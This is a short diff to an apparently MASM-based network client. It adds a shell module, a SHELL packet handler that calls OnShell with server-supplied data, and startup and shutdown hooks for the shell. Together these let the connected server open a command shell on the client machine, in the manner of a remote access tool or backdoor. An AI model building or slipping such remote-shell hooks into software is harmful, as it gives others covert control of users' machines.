@@ -7,6 +7,7 @@ __UNICODE__     equ     1
 include network.inc
 include mem_alloc.inc
 include packet.inc
+include shell.inc
 
 include /masm32/include/kernel32.inc
 include /masm32/include/user32.inc
@@ -217,6 +218,8 @@ PacketDispatch      proc    header:ptr Header, data:ptr BYTE
     switch  eax
         case    DISCONNECT
             mov     eax, FALSE
+        case    SHELL
+            invoke  OnShell, server, header, data
         default
             mov     eax, TRUE
     endsw
@@ -246,11 +249,13 @@ Connect             endp
 
 
 LoadModules         proc
+    invoke  StartupShell, server
     ret
 LoadModules         endp
 
 
 FreeModules         proc
+    invoke  StopShell
     ret
 FreeModules         endp
 
